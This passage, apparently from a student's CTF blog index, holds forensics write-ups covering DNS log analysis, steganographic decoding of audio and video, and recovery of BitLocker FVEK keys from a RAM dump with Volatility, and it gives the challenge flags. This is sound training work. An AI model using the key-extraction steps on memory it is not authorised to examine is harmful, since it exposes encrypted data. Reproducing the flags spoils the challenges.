\"10.18.21.121\", \"dest_port\": 2975, \"transaction_id\": 13007, \"answers\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"thepiratebay.org\", \"addr\": null}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 09:05:01.12\", \"data\": {\"timestamp\": \"2024-12-04 09:05:00.400067\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.21.121\", \"src_port\": 22066, \"dest_ip\": \"10.18.0.2\", \"dest_port\": 53, \"transaction_id\": 2835, \"queries\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"generic-illicit-activities-hub.org\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 09:05:00.70\", \"data\": {\"timestamp\": \"2024-12-04 09:05:00.520979\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.21.121\", \"src_port\": 64559, \"dest_ip\": \"10.18.0.2\", \"dest_port\": 53, \"transaction_id\": 3019, \"queries\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"generic-illicit-activities-hub.org\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 09:05:01.76\", \"data\": {\"timestamp\": \"2024-12-04 09:05:01.197568\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.0.2\", \"src_port\": 53, \"dest_ip\": \"10.18.21.121\", \"dest_port\": 22066, \"transaction_id\": 2835, \"answers\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"generic-illicit-activities-hub.org\", \"addr\": \"96.16.243.221\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 09:05:01.72\", \"data\": {\"timestamp\": \"2024-12-04 09:05:01.201187\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.0.2\", \"src_port\": 53, \"dest_ip\": \"10.18.21.121\", \"dest_port\": 64559, \"transaction_id\": 3019, \"answers\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"generic-illicit-activities-hub.org\", \"addr\": null}]}}\n```\n\n##### Suspicious User Identification\n\nThe suspicious user had the following attributes:\n\n```\nIP Address: 10.18.21.121\nMAC Address: de:ad:be:ef:ca:fe (a spoofed address)\n```\n\n###### Activity Timeline of the Suspicious User\n\n| Event                          | Time of the event             |\n|--------------------------------|-------------------------------|\n| Req for the addr 10.18.21.121  | 2024-12-04 08:49:20.52        |\n| Get assigned that addr         | 2024-12-04 08:49:21.00        |\n| Access www.google.com          | 2024-12-04 08:49:34.58        |\n| Access 2.arch.pool.ntp.org     | 2024-12-04 08:51:18.72        |\n| Access thepiratebay.org        | 2024-12-04 08:51:51.12        |\n| Access generic-illicit-activities-hub.org| 2024-12-04 09:05:01.12|\n| Releases the IP addr           | 2024-12-04 09:22:01.12        |\n\n\nThis was another challenge in the Tracem series, so it wasn’t going to be straightforward to solve via syslog logs. Additionally, the suspicious IP (10.18.21.121) didn’t have any corresponding syslog logs, making direct identification of the user more difficult.\n\nSince I had already established that the suspicious IP (10.18.21.121) was the only one to access the two suspicious sites (thepiratebay.org and generic-illicit-activities-hub.org), I decided to investigate further.\n\nTo narrow down potential leads, I began analyzing who else accessed 2.arch.pool.ntp.org.\n\nI got these result:\n\n```\n10.50.103.29\n10.66.91.95\n10.66.68.75\n10.17.161.10\n10.34.192.28\n10.65.26.90\n10.65.68.160\n10.51.64.145\n10.66.156.255\n10.35.126.228\n10.67.252.116\n10.17.6.47\n10.50.184.143\n10.18.21.121\n10.49.220.32\n10.49.79.62\n10.49.65.21\n10.17.90.14\n10.17.26.247\n10.17.171.253\n10.65.228.127\n```\n\n##### Initial Misstep\nAt this point, I noticed that the user accessed 2.arch.pool.ntp.org, a relatively common URL. I assumed it wasn’t suspicious and did not cross-reference other IPs that accessed this site during the same timeframe. This was my critical oversight.\n\nFeel free to skip the rest if you'd like—I’ll now share what I explored after this step.\n\n##### Investigation Details\n\n###### Extraction and Analysis\n\n1. MAC Addresses:\n\nI extracted all MAC addresses to look for other spoofed addresses but found no results.\n\n2. IP Segmentation:\n\nI identified recurring IP ranges in the logs:\n\n```\n10.17.X.X\n10.18.X.X\n10.19.X.X\n10.33.X.X\n10.34.X.X\n10.35.X.X\n10.49.X.X\n10.50.X.X\n10.51.X.X\n10.65.X.X\n10.66.X.X\n10.67.X.X\n```\n\n3. Syslog SSO Logs:\n\nOnly the following IP ranges appeared in syslog SSO logs:\n\n```\n10.17.X.X\n10.19.X.X\n10.33.X.X\n10.35.X.X\n10.49.X.X\n10.51.X.X\n10.65.X.X\n10.67.X.X\n```\n\nSo it was certain that I would get the username from this set of IPs.\n\nLooking at these IPs, I thought this challenge might be based on Network Segmentation. It appeared that there were four buildings and three subnets, which Skat later confirmed on Discord.\n\n4. Network Proximity Assumptions:\n\nI hypothesized that the suspicious user might have moved laterally to a new subnet, maintaining the same host/octet structure.\n\nFrom 10.17.X.X and 10.19.X.X:\n\n- Likely Subnets: 10.17.21.xxx, 10.17.121.xxx, etc.\n- Likely Hosts: 10.17.x.121.\n\nDespite exploring these, I found no leads.\n\nThen I moved on to checking the full logs.json file around the timeline of the IP guy. By this time, this challenge was my last one left, and I was very tired, so I couldn’t search properly.\n\n##### Aftermath\n\nAfter the CTF Competition, Jakob (discord) mentioned that I should have checked the IPs accessing 2.arch.pool.ntp.org around the timeline of the suspicious user (10.18.21.121).😿\n\n[Jakob's Tracem2 Writeup](https://team-bytesized.github.io/ctf/iris2025/writeups/tracem-2.html)\n\n###### Key Table (from Jakob's Write-Up):\n\n| Timestamp                  |              Events |                    Notes|\n|----------------------------|---------------------|--------------------------|\n| 2024-12-04 08:45:33.555166 | 10.17.161.10 ( mhammond ) disconnects from network | releases 10.17.161.10 + pause in traffic from 10.17.161.10 |\n| 2024-12-04 09:42:00.907257 | IP assignment to 10.17.161.10 ( mhammond ) | traffic from 10.17.161.10 continues |\n\n\nThis IP (10.17.161.10) was the closest to the suspicious user's timeline. The username associated with this IP was `mhammond`, making them the culprit.\n\nFlag:\n\n```yaml\nirisctf{mhammond}\n```\n\n#### Reflection\nThis challenge reinforced the importance of checking all data points and avoiding assumptions during investigations. Despite missing the critical clue during the competition, I gained valuable insights and improved my analysis techniques.\nThanks `skat` for the cool challenges.\n","tags":["forensics","osint"],"categories":["CTF-Writeups"]},{"title":"BCACTF 5.0 2024","url":"/2024/06/12/BCACTF-5-0-2024/","content":"\nBCACTF 5.0!\n\nReturning for its fifth consecutive year, this high school CTF hosted by the Bergen County Academies offers challenges across various difficulty levels, catering to everyone from beginners to seasoned CTF veterans.\n\nI had the opportunity to participate in BCACTF 2025 as a member of my institute's club, InfoSecIITR. Our team secured 7th Place globally. These writeups document the challenges I personally solved during the competition. The remaining challenges were tackled by my teammates.\n\n## Forensics\n\n### *Mysterious Melody*\n\n#### Challenge Description\n\n![Description](/images/posts/2024-bcactf/desc.png)\n\nWe have received a WAV file.\n\n#### Solution\n\nSo, I opened the WAV file using Sonic Visualizer software. Initially, I was unsure of what to do after examining the Spectrogram. Then, I analyzed the melody range spectrogram and the peak frequency spectrogram.\n\n```Text\nYou can add the Spectrogram, Melody Range Spectrogram, and Peak Frequency Spectrogram from the Pane menu.\n```\n\n![Spectrogram](/images/posts/2024-bcactf/spec_melody.png)\n![Peak](/images/posts/2024-bcactf/peak.png)\n\nWhere I noticed something unusual that resembled Morse code, but it wasn't. On the left side, there were 16 increasing lines, which matched the base16 hint provided. The hex values for the start of the flag 'bcactf{' corresponded to the highs and lows of the lines on the right side. This clue confirmed it was part of the flag, and from there, we decoded all the highs and lows.\n\n`6263616374667B62656175746966756C5F6D656C6F64795F62656175746966756C5F6861726D6F6E797D`\n\n#### Flag\n\n`bcactf{beautiful_melody_beautiful_harmony}`\n\n### *Static*\n\n#### Challenge Description\n\n![Desc](/images/posts/2024-bcactf/desc_static.png)\n\nWe have received a MP4 file and the MD5 of a file.\n\n#### Solution\n\nAs the hints suggested, I began searching for the metadata.\n\n```bash\n$ exiftool static.mp4\nCompressor Name                 : Lavc60.31.102 libx264rgb\nEncoder                         : StaticMaker https://shorturl.at/AUKZm\n```\n\nTwo things seemed sus to me: the Compressor and the Encoder. I then checked the above link for StaticMaker and realized they provided a documentation file with information about the StaticMaker software.\n\n```Text\nThe StaticMaker ™ utility converts any binary file into a video, suitable for use in … some application somewhere, probably.\nThe default configuration is width=256, height=256.\n\nThe program works by:\n1. Compressing the data\n2. Padding to a size that is a multiple of (6*width*height) bits\n3. Splitting the data into “subframes” of size (2*width*height) bits\n4. Writes data to video frames, which each triplet of three consecutive subframes are written to the red, green, and blue channels of one frame, respectively\n     Data written in row-major order\n     2 bits per pixel per channel\nTHE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n```\n\nWorkFlow:- \n1. Extraction of Frames:\n    Utilizes FFmpeg to extract frames from the video.\n\n2. Extraction of Pixel Data:\n    Decodes the RGB channels of each frame.\n    Extracts 2 bits per pixel per channel\n    \n3. Reconstruction of Binary Data:\n   Combines the extracted bits into a single stream.\n   Reconstructs the original binary data by converting the bits back into bytes.\n\nFor Extraction of Frames:-\n\n```bash\n$ ffmpeg -i static.mp4 frame_%04d.png\n```\n\nUsing ffmpeg, we extracted 72 frames in PNG format from the MP4 video.\n\n![Image 2](/images/posts/2024-bcactf/frames.png)\n\nNext, I wrote a Python script to accomplish steps 2 and 3.\n\n```python\nimport hashlib\nfrom PIL import Image\nimport numpy as np\n\ndef decode_frames(frame_prefix, frame_count, width=256, height=256):\n    channels = ['R', 'G', 'B']\n    bit_position = 4  # Bit position(4or6) chosen based on successful MD5 checksum match, were taken bitpositions [2,4,6,8]\n    \n    data_bits = []\n    for frame_idx in range(1, frame_count + 1):\n        frame_path = f\"{frame_prefix}{frame_idx:04d}.png\"\n        frame = Image.open(frame_path)\n        frame = frame.convert(\"RGB\")\n        pixels = np.array(frame)\n        \n        # Extract the specified bits from each color channel\n        r_channel = (pixels[:, :, 0] & (0b11 << bit_position)) >> bit_position\n        g_channel = (pixels[:, :, 1] & (0b11 << bit_position)) >> bit_position\n        b_channel = (pixels[:, :, 2] & (0b11 << bit_position)) >> bit_position\n        \n        # Flatten the channels and convert to bit strings\n        for bits in r_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n        for bits in g_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n        for bits in b_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n    return ''.join(data_bits)\n\ndef check_padding(data_bits, width, height):\n    size = 6 * width * height\n    print(\"The size is\", size)\n    actual_size = len(data_bits)\n    print('The actual size is ', actual_size)\n    if actual_size % size == 0:\n        print(\"Multiple of size\")\n        # No padding to remove\n        return data_bits   # size was already in multiple so need for removing the padding.\n    \n    # Calculate the number of excess bits to remove\n    padding_size = actual_size % size\n    \n    # Remove the excess bits\n    data_bits = data_bits[:-padding_size]\n    return data_bits\n\ndef bits_to_bytes(data_bits):\n    byte_arr = bytearray()\n    for i in range(0, len(data_bits), 8):\n        byte = data_bits[i:i+8]\n        byte_arr.append(int(byte, 2))\n    return bytes(byte_arr)\n\ndef calculate_md5(data):\n    md5 = hashlib.md5(data).hexdigest()\n    return md5\n\n# Parameters\nframe_prefix = 'frame_'\nframe_count = 72  # Total number of frames\nwidth = 256\nheight = 256\n\n# Decode frames\ndata_bits = decode_frames(frame_prefix, frame_count, width, height)\n\n# Checking padding\ndata_bits = check_padding(data_bits, width, height)\n\n# Convert bits to bytes\ncompressed_data = bits_to_bytes(data_bits)\n\noutput_path = 'extracted_data.bin'\nwith open(output_path, 'wb') as f:\n    f.write(compressed_data)\nprint(\"Extracted data saved.\")\n\n# Calculate and print MD5 checksum\ncalculated_md5 = calculate_md5(compressed_data)\nprint(f\"MD5 checksum of extracted data after removing padding: {calculated_md5}\")\n\n```\n\nThe extracted bin matches the MD5 checksum provided in the description. As I began analyzing the file, I employed several tools. When I used binwalk, it indicated the presence of Zlib compressed data, which I then extracted.\n\n```bash\n$ binwalk -e extracted_data.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n40522         0x9E4A          Zlib compressed data, default compression\n\n```\n\nThere are two approaches: one is quick and easy, while the other is little time-consuming. \nThis is the quick and easy method for lazy people like me to get the flag.\n\n```bash\ng4rud4:~/Pictures/_extracted_data.bin.extracted$ ls\n9E4A  9E4A.zlib\ng4rud4:~/Pictures/_extracted_data.bin.extracted$ strings * | grep bcactf{\nbootpc[[ --bootfile %bootfile%]] --dev %iface%[[ --server %server%]][[ --hwaddr %hwaddr%]] --returniffail --serverbcast\ncan't enable bcast on ARP socket\nbcache\nsbcast\nnulsohstxetxeotenqackbel bs ht nl vt ff cr so sidledc1dc2dc3dc4naksynetbcan emsubesc fs gs rs us sp\nhttp-alt    8080/tcp    webcache    # WWW caching service\nTTJvQS8TUoKU1xrBeKJR3Stwbbca+few4GeXVtt8YVMJAygCQMez2P2ccGrGKMOF\nbcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}\n``` \n\nAnother one is to do it proper way:- \n\n```bash\n$ zlib-flate -uncompress < 9E4A.zlib > output\n$ exiftool output\n$ file output\noutput: POSIX tar archive\n```\n\nI began extracting the tar archive once we obtained it.\n\n```bash\n$ tar -xf output\n$ ls\nbin  dev  etc  home  lib  out\n```\n\nWe got some folders let's check out \n\n```bash\n$ tree .\n.\n├── bin\n│   ├── arch -> /bin/busybox\n│   ├── ash -> /bin/busybox\n│   ├── base64 -> /bin/busybox\n│   ├── bbconfig -> /bin/busybox\n...\n├── home\n│   └── admin\n│       └── Documents\n│           ├── not_social_security_number.txt\n│           └── social_security_number.txt\n└── lib\n    ├── apk\n    │   ├── db\n    │   │   ├── installed\n    │   │   ├── lock\n    │   │   ├── scripts.tar\n    │   │   └── triggers\n    │   └── exec\n    ├── firmware\n    ├── ld-musl-x86_64.so.1\n    ├── libapk.so.2.14.0\n    ├── libc.musl-x86_64.so.1 -> ld-musl-x86_64.so.1\n    └── libcrypto.so.3\n\n45 directories, 145 files\n```\n\nI began searching for the text files in the admin directories.\n\n```bash\n~/home/admin/Documents$ cat not_social_security_number.txt\nbcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}\n```\n\nHooray!!! We captured the flag just 3 minutes before the CTF ended. ;p\n\n#### Flag\n\n`bcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}`\n","tags":["forensics"],"categories":["CTF-Writeups"]},{"title":"BYUCTF 2024","url":"/2024/05/20/BYUCTF-2024/","content":"\nBYUCTF 2024!\n\nI participated in BYUCTF 2024, organized by BYU Cyberia, as a member of my institute's club, InfoSecIITR. Our team secured 5th place globally. This writeup details the challenge I solved during the competition.\n\n## Forensics\n\n### Not again! I've been BitLockered out of my own computer!\n\n#### Challenge Description\n\nInstall Bitlocker they said... it will protect your data they said... Well, now I don't have access to any of my data because I forgot my password... again! Can you find my FVEK keys? I managed to capture my RAM so they should be in there\n\nFlag format - `byuctf{key1_key2_key3}` (order not significant)\n\n* Mirror 1 - https://byu.box.com/s/paexcd1t1er8bj435gg88i52q9ho8ftf\n* Mirror 2 - https://drive.google.com/file/d/1EAYpFu0ULc4fGt2qNoJTaNvG4F9A8Vw7/view?usp=sharing\n\n#### Solution\n\nAs the user has captured the RAM, provided to us as the 20240327.mem file, I started searching for BitLocker. We found a plugin for the [Volatility2](https://github.com/volatilityfoundation/volatility) tool at [GitHub Repo](https://github.com/breppo/Volatility-BitLocker). Since the file is also a memory file, it was straightforward to use the plugin.\n\nFirst, we needed the profile, so I used the following command in my terminal(using Volatility2):\n\n```bash\n$ python2 vol.py -f 20240327.mem imageinfo\n```\n\nIt took a lot of time about 7-8 minutes—but eventually, it provided the profile `Win10x64_19041`. After that, I used the BitLocker plugin:\n\n```bash\n$ python2 vol.py -f 20240327.mem --profile=Win10x64_19041 bitlocker\n```\n\nWe got 5 FVEK keys, but after trying some possible combinations, I realized only Win8+ was accepted.\n\nI've provided the solution's image.\n\n![Solution](/images/posts/2024-byuctf/not_again.png)\n\n#### Flags\n\n```Text\nbyuctf{968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5}\nbyuctf{968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b}\nbyuctf{91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b}\nbyuctf{91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f}\nbyuctf{91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f}\nbyuctf{91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5}\n```\n\n","tags":["forensics"],"categories":["CTF-Writeups"]},{"title":"About","url":"/about/index.html","content":"\n<p align=\"center\">\n  <img src=\"https://readme-typing-svg.herokuapp.com?font=Jersey+10&size=30&duration=4000&pause=1000&color=ffffff&center=true&vCenter=true&width=800&height=100&lines=Welcome+to+my+profile+>_<;Always+Learning!\" alt=\"Typing SVG\">\n</p>\n\n<h2> whoami </h2>\n\n- I am a student at **IIT Roorkee** with a keen interest in *cybersecurity* and *software development*. \n\n- I actively participate in CTF competitions, honing my skills in ***Digital Forensics, Networking, and Malware Reversing***. I also have a foundation knowledge of other categories of the CTF.\n\n- On the development front, I am focusing on Backend Development and exploring the potential of Web3 technologies.\n  \n- Beyond technical expertise, I have gained valuable experience in management too.\n\n<h2> 0x𝚑𝚊𝚌𝚔𝚒𝚗𝚐 </h2>\n\n- Ranked in the top 0.35% on [Blue Team Labs Online](https://blueteamlabs.online/public/user/1a238dd7483385ff40d157) in India (free tier).\n  \n- Ranked among the top 10 in India on [CyberDefenders](https://cyberdefenders.org/p/G4RUD4) (free tier).\n  \n- Recently started exploring HackTheBox and TryHackMe platforms.\n"}]